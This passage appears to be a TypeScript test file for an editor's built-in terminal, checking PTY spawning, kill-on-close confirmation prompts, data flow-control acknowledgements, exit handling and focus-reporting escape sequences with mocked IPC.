import { afterEach, beforeEach, describe, expect, it, jest, mock } from "bun:test";
import type { TerminalControllerDeps } from "../../../../../src/renderer/services/terminal/controller";
import type {
  PtyClientOptions,
  TerminalDimensions,
  TerminalInputCheckpoint,
} from "../../../../../src/renderer/services/terminal/types";

type IpcCallRecord = { channel: string; method: string; args: unknown };
type ListenerRecord = { channel: string; event: string; callback: (args: unknown) => void };

const ipcCalls: IpcCallRecord[] = [];
const listeners: ListenerRecord[] = [];

(globalThis as Record<string, unknown>).window = {
  ipc: {
    call: () => Promise.resolve(null),
    listen: () => {},
    off: () => {},
  },
  matchMedia: (_query: string) => ({
    matches: false,
    media: _query,
    onchange: null,
    addEventListener(): void {},
    removeEventListener(): void {},
    addListener(): void {},
    removeListener(): void {},
    dispatchEvent(): boolean {
      return false;
    },
  }),
};

(globalThis as Record<string, unknown>).document = {
  documentElement: {
    getAttribute: (_name: string): string | null => null,
    addEventListener: (_type: string, _listener: EventListenerOrEventListenerObject): void => {},
    removeEventListener: (_type: string, _listener: EventListenerOrEventListenerObject): void => {},
    setAttribute: (_name: string, _value: string): void => {},
  },
  fonts: { load: () => Promise.resolve([]) },
  hasFocus: (): boolean => false,
  activeElement: null,
};

let mockForegroundProcessName = "lazygit";
const foregroundByTab = new Map<string, string>();

mock.module("../../../../../src/renderer/ipc/client", () => ({
  ipcCallResult: mock((channel: string, method: string, args: unknown) => {
    ipcCalls.push({ channel, method, args });
    if (channel === "pty" && method === "spawn")
      return Promise.resolve({ ok: true as const, value: { pid: 1234 } });
    if (channel === "pty" && method === "foregroundProcess") {
      const tabId = (args as { tabId: string }).tabId;
      const name = foregroundByTab.get(tabId) ?? mockForegroundProcessName;
      return Promise.resolve({ ok: true as const, value: { name } });
    }
    return Promise.resolve({ ok: true as const, value: undefined });
  }),
  ipcListen: mock((channel: string, event: string, callback: (args: unknown) => void) => {
    const record = { channel, event, callback };
    listeners.push(record);
    return () => {
      const index = listeners.indexOf(record);
      if (index >= 0) listeners.splice(index, 1);
    };
  }),
  ipcStream: mock(() => ({ promise: new Promise(() => {}), onProgress: () => () => {} })),
  canUseIpcBridge: mock(() => false),
  unwrapIpcResult: <T>(result: { ok: boolean; value?: T; message?: string; kind?: string }): T => {
    if (result.ok) return result.value as T;
    const err = new Error(result.message ?? "ipc error");
    err.name = `IpcError[${result.kind ?? "unknown"}]`;
    throw err;
  },
  mustSucceed: <T>(result: { ok: boolean; value?: T; message?: string; kind?: string }): T => {
    if (result.ok) return result.value as T;
    const err = new Error(result.message ?? "ipc error");
    err.name = `IpcError[${result.kind ?? "unknown"}]`;
    throw err;
  },
  unwrapGitResult: <T>(result: { ok: boolean; value?: T; message?: string; kind?: string }): T => {
    if (result.ok) return result.value as T;
    const err = new Error(result.message ?? "git ipc error");
    throw err;
  },
  isIpcResult: (v: unknown): boolean =>
    v !== null && typeof v === "object" && "ok" in (v as object),
  isIpcOkResult: (v: unknown): boolean =>
    v !== null && typeof v === "object" && (v as Record<string, unknown>)["ok"] === true,
  isIpcErrResult: (v: unknown): boolean =>
    v !== null && typeof v === "object" && (v as Record<string, unknown>)["ok"] === false,
}));

const confirmRequests: string[] = [];
let confirmReply = true;
const realConfirmDialog = await import("../../../../../src/renderer/components/ui/confirm-dialog");
mock.module("../../../../../src/renderer/components/ui/confirm-dialog", () => ({
  ...realConfirmDialog,
  showConfirmDialog: (request: { description: string }) => {
    confirmRequests.push(request.description);
    return Promise.resolve(confirmReply);
  },
}));

const mockSaveConfirm = mock(async (_filename: string) => "cancel" as const);
const realSaveConfirm = await import(
  "../../../../../src/renderer/components/editor/save-confirm-dialog"
);
mock.module("../../../../../src/renderer/components/editor/save-confirm-dialog", () => ({
  ...realSaveConfirm,
  showSaveConfirm: mockSaveConfirm,
}));

const toasts: { kind: string; message: string }[] = [];
const realToast = await import("../../../../../src/renderer/components/ui/toast");
mock.module("../../../../../src/renderer/components/ui/toast", () => ({
  ...realToast,
  showToast: (input: { kind: string; message: string }) => {
    toasts.push(input);
  },
}));

const { resumeInTerminal, watchAgentInput } = await import(
  "../../../../../src/renderer/services/agent-view/resume-terminal"
);
const { registerTerminalController } = await import(
  "../../../../../src/renderer/services/terminal/terminal-registry"
);
const { closeTerminal, closeTerminalWithConfirm, openTerminal } = await import(
  "../../../../../src/renderer/services/terminal"
);
const {
  createTerminalController,
  isShellPromptLikeTitle,
  isLoginShell,
  classifyOscTitle,
  foregroundConfirmsTitle,
  oscCursorStyle,
  escapeDroppedPath,
} = await import("../../../../../src/renderer/services/terminal/controller");
const { createPtyClient, STARTUP_INPUT_QUIET_MS } = await import(
  "../../../../../src/renderer/services/terminal/pty-client"
);
const { subscribeTerminalReopenRequest } = await import(
  "../../../../../src/renderer/services/terminal/reopen-requests"
);
const { closeGroup } = await import("../../../../../src/renderer/state/operations");
const { cacheUriFor } = await import("../../../../../src/renderer/services/editor/model/cache");
const { attachDirtyTracker, detachDirtyTracker } = await import(
  "../../../../../src/renderer/services/editor/model/dirty-tracker"
);
const { closeGroupWithConfirm } = await import(
  "../../../../../src/renderer/services/editor/save/close-tab"
);
const { startTerminalExitListener } = await import(
  "../../../../../src/renderer/state/terminal-exit"
);
const { useLayoutStore } = await import("../../../../../src/renderer/state/stores/layout");
const { useTabsStore } = await import("../../../../../src/renderer/state/stores/tabs");
const { useTerminalStore } = await import("../../../../../src/renderer/state/stores/terminal");

const WS = "aaaaaaaa-aaaa-4aaa-aaaa-aaaaaaaaaaaa";
const OTHER_WS = "bbbbbbbb-bbbb-4bbb-bbbb-bbbbbbbbbbbb";

function resetStores(): void {
  useTabsStore.setState({ byWorkspace: {} });
  useLayoutStore.setState({ byWorkspace: {} });
}

function resetIpc(): void {
  ipcCalls.length = 0;
  listeners.length = 0;
}

function emit(channel: string, event: string, args: unknown): void {
  for (const listener of [...listeners]) {
    if (listener.channel === channel && listener.event === event) listener.callback(args);
  }
}

function killCalls(): IpcCallRecord[] {
  return ipcCalls.filter((call) => call.channel === "pty" && call.method === "kill");
}

async function flushTerminalInit(): Promise<void> {
  await Promise.resolve();
  await Promise.resolve();
}

function makeTerminalControllerDeps(
  spawnImpl: (dimensions: TerminalDimensions) => Promise<{ pid: number } | null> = () =>
    Promise.resolve({ pid: 4321 }),
) {
  const writes: string[] = [];
  const unparsedWriteCallbacks: Array<() => void> = [];
  const spawnCalls: TerminalDimensions[] = [];
  const ptyWrites: string[] = [];
  const pastes: string[] = [];
  let focusCalls = 0;
  let capturedDataHandler: ((data: string) => void) | null = null;
  let ptyOptions: PtyClientOptions | null = null;
  const bufferState: { active: { type: "normal" | "alternate" } & Record<string, unknown> } = {
    active: { type: "alternate" },
  };
  let capturedSoftReset: (() => boolean) | null = null;
  let capturedReset: (() => boolean) | null = null;
  const modes = { bracketedPasteMode: false, sendFocusMode: false };
  let selection = "";
  let capturedKeyHandler: ((event: KeyboardEvent) => boolean) | null = null;
  let capturedTitleHandler: ((title: string) => void) | null = null;
  let capturedAltExitHandler: ((params: ReadonlyArray<number | number[]>) => boolean) | null = null;
  let capturedAltEnterHandler: ((params: ReadonlyArray<number | number[]>) => boolean) | null =
    null;
  const oscHandlers = new Map<number, (data: string) => boolean>();
  const textarea = {} as HTMLTextAreaElement;
  const deps: TerminalControllerDeps = {
    waitForTerminalFonts: () => Promise.resolve(),
    createTerminal: () => ({
      element: undefined,
      textarea,
      rows: 24,
      parser: {
        registerOscHandler: (id: number, cb: (data: string) => boolean) => {
          oscHandlers.set(id, cb);
          return { dispose: () => {} };
        },
        registerCsiHandler: (
          id: { prefix?: string; intermediates?: string; final: string },
          cb: (params: ReadonlyArray<number | number[]>) => boolean,
        ) => {
          if (id.prefix === "?" && id.final === "l") {
            const previous = capturedAltExitHandler;
            capturedAltExitHandler = (params) => {
              const handled = previous?.(params) ?? false;
              return cb(params) || handled;
            };
          } else if (id.intermediates === "!" && id.final === "p") {
            capturedSoftReset = () => cb([]);
          } else if (id.prefix === "?" && id.final === "h") {
            const previous = capturedAltEnterHandler;
            capturedAltEnterHandler = (params) => {
              const handled = previous?.(params) ?? false;
              return cb(params) || handled;
            };
          }
          return { dispose: () => {} };
        },
        registerEscHandler: (id: { final: string }, cb: () => boolean) => {
          if (id.final === "c") capturedReset = cb;
          return { dispose: () => {} };
        },
      },
      buffer: bufferState,
      modes,
      options: { theme: undefined, fontSize: 14, cursorStyle: "block", fontFamily: "monospace" },
      dispose: () => {},
      loadAddon: () => {},
      onData: (handler) => {
        capturedDataHandler = handler;
        return { dispose: () => {} };
      },
      onSelectionChange: () => ({ dispose: () => {} }),
      onTitleChange: (handler) => {
        capturedTitleHandler = handler;
        return { dispose: () => {} };
      },
      getSelection: () => selection,
      paste: (data) => {
        pastes.push(data);
      },
      clearSelection: () => {
        selection = "";
      },
      open: () => {},
      refresh: () => {},
      write: (data, callback) => {
        writes.push(data);
        if (callback) unparsedWriteCallbacks.push(callback);
      },
      attachCustomKeyEventHandler: (handler) => {
        capturedKeyHandler = handler;
      },
      focus: () => {
        focusCalls += 1;
      },
    }),
    createFitAddon: () => ({
      dispose: () => {},
      fit: () => {},
      proposeDimensions: () => ({ cols: 100, rows: 40 }),
    }),
    loadLigaturesAddon: async () => () => ({ dispose: () => {} }),
    createPtyClient: (options) => {
      ptyOptions = options;
      return {
        spawn: (dimensions) => {
          spawnCalls.push({ ...dimensions });
          return spawnImpl(dimensions);
        },
        write: (data) => {
          ptyWrites.push(data);
        },
        resize: () => {},
        dispose: () => {},
      };
    },
    createResizeObserver: () => ({ observe: () => {}, disconnect: () => {} }),
    requestAnimationFrame: () => 1,
    cancelAnimationFrame: () => {},
  };
  return {
    deps,
    spawnCalls,
    writes,
    ptyWrites,
    pastes,
    getPtyOptions: () => ptyOptions,
    getFocusCalls: () => focusCalls,
    termData(data: string): void {
      capturedDataHandler?.(data);
    },
    parseWrites(): void {
      for (const callback of unparsedWriteCallbacks.splice(0)) callback();
    },
    getKeyHandler: () => capturedKeyHandler,
    osc(id: number, data: string): void {
      oscHandlers.get(id)?.(data);
    },
    textarea,
    getTitleHandler: () => capturedTitleHandler,
    getAltExitHandler: () => capturedAltExitHandler,
    getAltEnterHandler: () => capturedAltEnterHandler,
    setBufferType(type: "normal" | "alternate"): void {
      bufferState.active.type = type;
    },
    setScreen(rows: string[], cursor: { x: number; y: number }): void {
      const cols = 20;
      const zero = () => 0;
      const cellOf = (chars: string) => ({
        getWidth: () => 1,
        getChars: () => chars,
        isFgDefault: () => true,
        isFgPalette: () => false,
        isFgRGB: () => false,
        getFgColor: zero,
        isBgDefault: () => true,
        isBgPalette: () => false,
        isBgRGB: () => false,
        getBgColor: zero,
        isBold: zero,
        isDim: zero,
        isItalic: zero,
        isUnderline: zero,
        isBlink: zero,
        isInverse: zero,
        isInvisible: zero,
        isStrikethrough: zero,
        isOverline: zero,
      });
      const lineOf = (text: string) => ({
        isWrapped: false,
        length: cols,
        translateToString: (trim?: boolean) => (trim ? text.trimEnd() : text.padEnd(cols)),
        getCell: (x: number) => (x < cols ? cellOf(text[x] ?? "") : undefined),
      });
      Object.assign(bufferState.active, {
        length: rows.length,
        getLine: (y: number) => (rows[y] === undefined ? undefined : lineOf(rows[y])),
        cursorX: cursor.x,
        cursorY: cursor.y,
        baseY: 0,
      });
    },
    softReset: () => capturedSoftReset?.(),
    reset: () => capturedReset?.(),
    setBracketedPaste(on: boolean): void {
      modes.bracketedPasteMode = on;
    },
    setFocusReporting(on: boolean): void {
      modes.sendFocusMode = on;
    },
    setSelection(text: string): void {
      selection = text;
    },
    getSelection: () => selection,
  };
}

describe("services/terminal open and close", () => {
  beforeEach(() => {
    resetStores();
    resetIpc();
  });

  it("a terminal opened for a profile keeps it, and its shell is spawned in it", async () => {
    const terminal = openTerminal({ workspaceId: WS, cwd: "/workspace", profile: "codex-ab12" });
    const tab = useTabsStore.getState().byWorkspace[WS]?.[terminal.tabId];
    expect(tab?.type === "terminal" ? tab.props.profile : null).toBe("codex-ab12");

    const client = createPtyClient({
      workspaceId: WS,
      tabId: terminal.tabId,
      cwd: "/workspace",
      profile: "codex-ab12",
      onData: () => {},
      onExit: () => {},
    });
    await client.spawn({ cols: 80, rows: 24 });
    expect(ipcCalls.find((call) => call.method === "spawn")?.args).toMatchObject({
      tabId: terminal.tabId,
      profile: "codex-ab12",
    });
    client.dispose();
  });

  it("closeTerminal kills the PTY session and closes the tab transaction", () => {
    const terminal = openTerminal({ workspaceId: WS, cwd: "/workspace" });

    closeTerminal(terminal.tabId);

    expect(killCalls()).toEqual([
      { channel: "pty", method: "kill", args: { workspaceId: WS, tabId: terminal.tabId } },
    ]);
    expect(useTabsStore.getState().byWorkspace[WS]?.[terminal.tabId]).toBeUndefined();
    const layout = useLayoutStore.getState().byWorkspace[WS];
    expect(layout?.root.kind).toBe("leaf");
    if (layout?.root.kind === "leaf") expect(layout.root.tabIds).not.toContain(terminal.tabId);
  });

  describe("closeTerminalWithConfirm", () => {
    beforeEach(() => {
      confirmRequests.length = 0;
      confirmReply = true;
    });

    afterEach(() => {
      mockForegroundProcessName = "lazygit";
    });

    it("closes without asking while only the shell is running", async () => {
      mockForegroundProcessName = "-zsh";
      const terminal = openTerminal({ workspaceId: WS, cwd: "/workspace" });

      expect(await closeTerminalWithConfirm(WS, terminal.tabId)).toBe("closed");
      expect(confirmRequests).toEqual([]);
      expect(useTabsStore.getState().byWorkspace[WS]?.[terminal.tabId]).toBeUndefined();
    });

    it("asks before killing a running program and keeps the tab on cancel", async () => {
      mockForegroundProcessName = "sleep";
      const terminal = openTerminal({ workspaceId: WS, cwd: "/workspace" });
      confirmReply = false;

      expect(await closeTerminalWithConfirm(WS, terminal.tabId)).toBe("cancelled");
      expect(confirmRequests).toEqual(["Closing the terminal also terminates “sleep”."]);
      expect(killCalls()).toEqual([]);
      expect(useTabsStore.getState().byWorkspace[WS]?.[terminal.tabId]).toBeDefined();

      confirmReply = true;
      expect(await closeTerminalWithConfirm(WS, terminal.tabId)).toBe("closed");
      expect(killCalls()).toHaveLength(1);
    });

    it("closes an ended terminal without asking", async () => {
      mockForegroundProcessName = "sleep";
      const terminal = openTerminal({ workspaceId: WS, cwd: "/workspace" });
      useTabsStore.getState().setTerminalDead(WS, terminal.tabId, true);

      expect(await closeTerminalWithConfirm(WS, terminal.tabId)).toBe("closed");
      expect(confirmRequests).toEqual([]);
    });
  });

  it("workspace tab-record cleanup kills each terminal session before deleting records", () => {
    const first = openTerminal({ workspaceId: WS, cwd: "/workspace/a" });
    const second = openTerminal({ workspaceId: WS, cwd: "/workspace/b" });
    useTabsStore.getState().createTab(WS, {
      type: "editor",
      props: { workspaceId: WS, filePath: "/workspace/file.ts" },
    });

    useTabsStore.getState().closeAllForWorkspace(WS);

    expect(killCalls()).toEqual([
      { channel: "pty", method: "kill", args: { workspaceId: WS, tabId: first.tabId } },
      { channel: "pty", method: "kill", args: { workspaceId: WS, tabId: second.tabId } },
    ]);
    expect(useTabsStore.getState().byWorkspace[WS]).toBeUndefined();
  });

  it("closeGroup kills terminal sessions in the group before removing their tab records", () => {
    const left = openTerminal({ workspaceId: WS, cwd: "/workspace/left" });
    const rightGroupId = useLayoutStore
      .getState()
      .splitGroup(WS, left.groupId, "horizontal", "after");
    const right = openTerminal(
      { workspaceId: WS, cwd: "/workspace/right" },
      { groupId: rightGroupId },
    );
    const editor = useTabsStore.getState().createTab(WS, {
      type: "editor",
      props: { workspaceId: WS, filePath: "/workspace/file.ts" },
    });
    useLayoutStore.getState().attachTab(WS, rightGroupId, editor.id);

    closeGroup(WS, rightGroupId);

    expect(killCalls()).toEqual([
      { channel: "pty", method: "kill", args: { workspaceId: WS, tabId: right.tabId } },
    ]);
    const wsTabs = useTabsStore.getState().byWorkspace[WS];
    expect(wsTabs?.[left.tabId]).toBeDefined();
    expect(wsTabs?.[right.tabId]).toBeUndefined();
    expect(wsTabs?.[editor.id]).toBeUndefined();
  });

  it("killTerminalSessions kills only the terminal sessions it is given", () => {
    const first = openTerminal({ workspaceId: WS, cwd: "/workspace/a" });
    const second = openTerminal({ workspaceId: WS, cwd: "/workspace/b" });
    const editor = useTabsStore.getState().createTab(WS, {
      type: "editor",
      props: { workspaceId: WS, filePath: "/workspace/file.ts" },
    });

    useTabsStore.getState().killTerminalSessions(WS, [second.tabId, editor.id]);

    expect(killCalls()).toEqual([
      { channel: "pty", method: "kill", args: { workspaceId: WS, tabId: second.tabId } },
    ]);
    expect(useTabsStore.getState().byWorkspace[WS]?.[first.tabId]).toBeDefined();
    expect(useTabsStore.getState().byWorkspace[WS]?.[second.tabId]).toBeDefined();
  });

  describe("closeGroupWithConfirm", () => {
    beforeEach(() => {
      confirmRequests.length = 0;
      confirmReply = true;
      mockSaveConfirm.mockClear();
    });

    afterEach(() => {
      mockForegroundProcessName = "lazygit";
      foregroundByTab.clear();
    });

    function terminalInSecondGroup(): { groupId: string; tabId: string; leftTabId: string } {
      const left = openTerminal({ workspaceId: WS, cwd: "/workspace/left" });
      const groupId = useLayoutStore.getState().splitGroup(WS, left.groupId, "horizontal", "after");
      const right = openTerminal({ workspaceId: WS, cwd: "/workspace/right" }, { groupId });
      return { groupId, tabId: right.tabId, leftTabId: left.tabId };
    }

    it("asks before killing a program running in the group and keeps the group on cancel", async () => {
      mockForegroundProcessName = "sleep";
      const { groupId, tabId } = terminalInSecondGroup();
      confirmReply = false;

      expect(await closeGroupWithConfirm(WS, groupId)).toBe("cancelled");
      expect(confirmRequests).toEqual(["Closing the terminal also terminates “sleep”."]);
      expect(killCalls()).toEqual([]);
      expect(useTabsStore.getState().byWorkspace[WS]?.[tabId]).toBeDefined();
    });

    it("closes the group once the running program may end", async () => {
      mockForegroundProcessName = "sleep";
      const { groupId, tabId, leftTabId } = terminalInSecondGroup();

      expect(await closeGroupWithConfirm(WS, groupId)).toBe("closed");
      expect(confirmRequests).toHaveLength(1);
      expect(killCalls()).toEqual([
        { channel: "pty", method: "kill", args: { workspaceId: WS, tabId } },
      ]);
      const wsTabs = useTabsStore.getState().byWorkspace[WS];
      expect(wsTabs?.[tabId]).toBeUndefined();
      expect(wsTabs?.[leftTabId]).toBeDefined();
    });

    it("keeps the idle and running terminals when a group close is cancelled", async () => {
      const { groupId, tabId: idleTabId } = terminalInSecondGroup();
      const running = openTerminal({ workspaceId: WS, cwd: "/workspace/run" }, { groupId });
      foregroundByTab.set(idleTabId, "powershell");
      foregroundByTab.set(running.tabId, "sleep");
      confirmReply = false;
      const layout = useLayoutStore.getState().byWorkspace[WS];

      expect(await closeGroupWithConfirm(WS, groupId)).toBe("cancelled");
      expect(confirmRequests).toHaveLength(1);
      expect(killCalls()).toEqual([]);
      expect(useLayoutStore.getState().byWorkspace[WS]).toBe(layout);
      const tabs = useTabsStore.getState().byWorkspace[WS];
      expect(tabs?.[idleTabId]).toBeDefined();
      expect(tabs?.[running.tabId]).toBeDefined();
    });

    it("lists both running programs in one prompt before killing both sessions", async () => {
      const { groupId, tabId } = terminalInSecondGroup();
      const second = openTerminal({ workspaceId: WS, cwd: "/workspace/run" }, { groupId });
      foregroundByTab.set(tabId, "sleep");
      foregroundByTab.set(second.tabId, "ping");

      expect(await closeGroupWithConfirm(WS, groupId)).toBe("closed");
      expect(confirmRequests).toEqual(["Closing the terminal also terminates “sleep, ping”."]);
      expect(killCalls()).toEqual([
        { channel: "pty", method: "kill", args: { workspaceId: WS, tabId } },
        { channel: "pty", method: "kill", args: { workspaceId: WS, tabId: second.tabId } },
      ]);
    });

    it("lists the same running program only once for two terminals", async () => {
      mockForegroundProcessName = "PING";
      const { groupId } = terminalInSecondGroup();
      openTerminal({ workspaceId: WS, cwd: "/workspace/run" }, { groupId });

      expect(await closeGroupWithConfirm(WS, groupId)).toBe("closed");
      expect(confirmRequests).toEqual(["Closing the terminal also terminates “PING”."]);
      expect(killCalls()).toHaveLength(2);
    });

    it("keeps the running terminal when the editor save prompt is cancelled", async () => {
      const { groupId, tabId } = terminalInSecondGroup();
      const filePath = "/workspace/dirty.ts";
      const editor = useTabsStore.getState().createTab(WS, {
        type: "editor",
        props: { workspaceId: WS, filePath },
      });
      useLayoutStore.getState().attachTab(WS, groupId, editor.id);
      const cacheUri = cacheUriFor(WS, filePath);
      let version = 1;
      let onChange: (() => void) | undefined;
      attachDirtyTracker({
        cacheUri,
        model: {
          getAlternativeVersionId: () => version,
          onDidChangeContent: (callback: () => void) => {
            onChange = callback;
            return { dispose: () => {} };
          },
        } as never,
        loadedMtime: "T0",
        loadedSize: 0,
      });
      version++;
      onChange?.();
      mockSaveConfirm.mockImplementationOnce(async () => {
        expect(confirmRequests).toHaveLength(1);
        expect(killCalls()).toEqual([]);
        return "cancel";
      });

      try {
        expect(await closeGroupWithConfirm(WS, groupId)).toBe("cancelled");
        expect(mockSaveConfirm).toHaveBeenCalledWith("dirty.ts");
        expect(killCalls()).toEqual([]);
        const tabs = useTabsStore.getState().byWorkspace[WS];
        expect(tabs?.[tabId]).toBeDefined();
        expect(tabs?.[editor.id]).toBeDefined();
      } finally {
        detachDirtyTracker(cacheUri);
      }
    });
  });

  it("terminal controller dispose does not kill the PTY session", async () => {
    const controller = createTerminalController({
      workspaceId: WS,
      tabId: "controller-no-kill",
      cwd: "/workspace",
      container: {} as HTMLElement,
    });

    controller.dispose();
    await Promise.resolve();

    expect(killCalls()).toEqual([]);
  });
});

describe("services/terminal pty-client flow control", () => {
  beforeEach(resetIpc);

  it("acks PTY data each time a tab reaches the 5000-char threshold", () => {
    const received: string[] = [];
    const client = createPtyClient({
      workspaceId: WS,
      tabId: "tab-flow-a",
      cwd: "/workspace",
      onData: (chunk) => received.push(chunk),
      onExit: () => {},
    });

    emit("pty", "data", { workspaceId: WS, tabId: "tab-flow-a", chunk: "a".repeat(4999) });
    expect(ipcCalls.filter((call) => call.method === "ack")).toHaveLength(0);

    emit("pty", "data", { workspaceId: WS, tabId: "tab-flow-a", chunk: "b" });

    expect(received.join("").length).toBe(5000);
    expect(ipcCalls).toContainEqual({
      channel: "pty",
      method: "ack",
      args: { workspaceId: WS, tabId: "tab-flow-a", bytesConsumed: 5000 },
    });

    client.dispose();
  });

  it("tells the terminal which output is replayed", () => {
    const received: Array<[string, boolean]> = [];
    const client = createPtyClient({
      workspaceId: WS,
      tabId: "tab-replay-flag",
      cwd: "/workspace",
      onData: (chunk, replay) => received.push([chunk, replay]),
      onExit: () => {},
    });

    emit("pty", "data", { workspaceId: WS, tabId: "tab-replay-flag", chunk: "old", replay: true });
    emit("pty", "data", { workspaceId: WS, tabId: "tab-replay-flag", chunk: "new" });

    expect(received).toEqual([
      ["old", true],
      ["new", false],
    ]);
    client.dispose();
  });

  it("keeps ACK counters module-private and isolated by tabId", () => {
    const clientA = createPtyClient({
      workspaceId: WS,
      tabId: "tab-flow-b-a",
      cwd: "/workspace",
      onData: () => {},
      onExit: () => {},
    });
    const clientB = createPtyClient({
      workspaceId: WS,
      tabId: "tab-flow-b-b",
      cwd: "/workspace",
      onData: () => {},
      onExit: () => {},
    });

    emit("pty", "data", { workspaceId: WS, tabId: "tab-flow-b-a", chunk: "a".repeat(3000) });
    emit("pty", "data", { workspaceId: WS, tabId: "tab-flow-b-b", chunk: "b".repeat(3000) });
    emit("pty", "data", { workspaceId: WS, tabId: "tab-flow-b-a", chunk: "a".repeat(2000) });

    expect(ipcCalls.filter((call) => call.method === "ack")).toEqual([
      {
        channel: "pty",
        method: "ack",
        args: { workspaceId: WS, tabId: "tab-flow-b-a", bytesConsumed: 5000 },
      },
    ]);

    clientA.dispose();
    clientB.dispose();
  });

  it("disposing a PTY client removes listeners without killing the session", () => {
    let received = 0;
    const client = createPtyClient({
      workspaceId: WS,
      tabId: "tab-dispose-no-kill",
      cwd: "/workspace",
      onData: () => {
        received += 1;
      },
      onExit: () => {},
    });

    client.dispose();
    emit("pty", "data", {
      workspaceId: WS,
      tabId: "tab-dispose-no-kill",
      chunk: "after dispose",
    });

    expect(received).toBe(0);
    expect(ipcCalls.some((call) => call.channel === "pty" && call.method === "kill")).toBe(false);
  });
});

describe("services/terminal pty-client exit lifecycle", () => {
  beforeEach(resetIpc);

  it("on pty:exit, onExit fires with the exit code and data is no longer delivered", () => {
    let received = "";
    const exits: Array<{ code: number | null }> = [];
    const client = createPtyClient({
      workspaceId: WS,
      tabId: "tab-exit",
      cwd: "/workspace",
      onData: (chunk) => {
        received += chunk;
      },
      onExit: (info) => {
        exits.push(info);
      },
    });

    emit("pty", "data", { workspaceId: WS, tabId: "tab-exit", chunk: "alive" });
    expect(received).toBe("alive");

    emit("pty", "exit", { workspaceId: WS, tabId: "tab-exit", code: 0 });
    expect(exits).toEqual([{ code: 0 }]);

    emit("pty", "data", { workspaceId: WS, tabId: "tab-exit", chunk: "ghost" });
    expect(received).toBe("aliveghost");

    client.dispose();
    emit("pty", "exit", { workspaceId: WS, tabId: "tab-exit", code: 0 });
    expect(exits).toEqual([{ code: 0 }]);
  });

  it("after pty:exit, the next spawnSession for the same tabId is not short-circuited as already-live", async () => {
    const client = createPtyClient({
      workspaceId: WS,
      tabId: "tab-respawn",
      cwd: "/workspace",
      onData: () => {},
      onExit: () => {},
    });

    const first = await client.spawn({ cols: 80, rows: 24 });
    expect(first).toEqual({ pid: 1234 });

    emit("pty", "exit", { workspaceId: WS, tabId: "tab-respawn", code: 0 });

    const beforeCount = ipcCalls.filter((c) => c.channel === "pty" && c.method === "spawn").length;
    const second = await client.spawn({ cols: 80, rows: 24 });
    const afterCount = ipcCalls.filter((c) => c.channel === "pty" && c.method === "spawn").length;

    expect(second).toEqual({ pid: 1234 });
    expect(afterCount - beforeCount).toBe(1);

    client.dispose();
  });

  it("ignores pty:exit destined for a different tabId", () => {
    let exitFired = false;
    const client = createPtyClient({
      workspaceId: WS,
      tabId: "tab-self",
      cwd: "/workspace",
      onData: () => {},
      onExit: () => {
        exitFired = true;
      },
    });

    emit("pty", "exit", { workspaceId: WS, tabId: "tab-other", code: 1 });
    expect(exitFired).toBe(false);

    client.dispose();
  });

  it("ignores PTY data and exits destined for a different workspaceId", () => {
    let received = "";
    let exitFired = false;
    const client = createPtyClient({
      workspaceId: WS,
      tabId: "tab-same-id",
      cwd: "/workspace",
      onData: (chunk) => {
        received += chunk;
      },
      onExit: () => {
        exitFired = true;
      },
    });

    emit("pty", "data", { workspaceId: OTHER_WS, tabId: "tab-same-id", chunk: "wrong" });
    emit("pty", "exit", { workspaceId: OTHER_WS, tabId: "tab-same-id", code: 1 });

    expect(received).toBe("");
    expect(exitFired).toBe(false);

    client.dispose();
  });

  it("lets pty:exit mark the matching terminal tab dead synchronously", () => {
    resetStores();
    const terminal = openTerminal({ workspaceId: WS, cwd: "/workspace" });
    const client = createPtyClient({
      workspaceId: WS,
      tabId: terminal.tabId,
      cwd: "/workspace",
      onData: () => {},
      onExit: () => {
        useTabsStore.getState().setTerminalDead(WS, terminal.tabId, true);
      },
    });

    emit("pty", "exit", { workspaceId: WS, tabId: terminal.tabId, code: null });

    const tab = useTabsStore.getState().byWorkspace[WS]?.[terminal.tabId];
    expect(tab?.type).toBe("terminal");
    if (tab?.type === "terminal") expect(tab.props.dead).toBe(true);

    client.dispose();
  });
});

describe("app-wide terminal exit listener", () => {
  beforeEach(() => {
    resetIpc();
    resetStores();
  });

  it("marks a tab whose view is unmounted dead and lets its next spawn reach main", async () => {
    const stop = startTerminalExitListener();
    const terminal = openTerminal({ workspaceId: WS, cwd: "/workspace" });
    const options = {
      workspaceId: WS,
      tabId: terminal.tabId,
      cwd: "/workspace",
      onData: () => {},
      onExit: () => {},
    };
    const client = createPtyClient(options);
    await client.spawn({ cols: 80, rows: 24 });
    client.dispose();

    emit("pty", "exit", { workspaceId: WS, tabId: terminal.tabId, code: null });

    const tab = useTabsStore.getState().byWorkspace[WS]?.[terminal.tabId];
    expect(tab?.type === "terminal" && tab.props.dead).toBe(true);

    const spawnCount = () =>
      ipcCalls.filter((c) => c.channel === "pty" && c.method === "spawn").length;
    const before = spawnCount();
    const remounted = createPtyClient(options);
    expect(await remounted.spawn({ cols: 80, rows: 24 })).toEqual({ pid: 1234 });
    expect(spawnCount() - before).toBe(1);

    remounted.dispose();
    stop();
  });
});

describe("services/terminal controller focus", () => {
  beforeEach(() => {
    resetIpc();
    jest.useFakeTimers();
  });
  afterEach(() => jest.useRealTimers());

  const afterFocusReportDelay = () => jest.advanceTimersByTime(300);

  it("tells a program turning on focus reporting that an unfocused terminal is not focused", async () => {
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: "tab-focus-report",
        cwd: "/workspace",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
      },
      harness.deps,
    );
    await flushTerminalInit();
    const decset = harness.getAltEnterHandler();
    if (!decset) throw new Error("no DECSET handler");

    expect(decset([2004])).toBe(false);
    await afterFocusReportDelay();
    expect(harness.ptyWrites).toEqual([]);

    expect(decset([1004])).toBe(false);
    harness.setFocusReporting(true);
    expect(harness.ptyWrites).toEqual([]);
    await afterFocusReportDelay();
    expect(harness.ptyWrites).toEqual(["\x1b[O"]);

    controller.dispose();
  });

  it("tells another device where the cursor is, unless the program hid it", async () => {
    const harness = makeTerminalControllerDeps();
    const controller = createTerminalController(
      {
        workspaceId: WS,
        tabId: "tab-cursor",
        cwd: "/workspace",
        container: { clientWidth: 800, clientHeight: 480 } as HTMLElement,
      },
      harness.deps,
    );
    await flushTerminalInit();
    harness.setScreen(["$ git sta", ""], { x: 7, y: 0 });
    expect(controller.readScreen(50)).toEqual({
      text: "$ git sta",
      caret: { line: 0, column: 7 },
    });
    const decset = harness.getAltEnterHandler();
    const decrst = harness.getAltExitHandler();
    if (!decset || !decrst) throw new Error("no DECSET handlers");
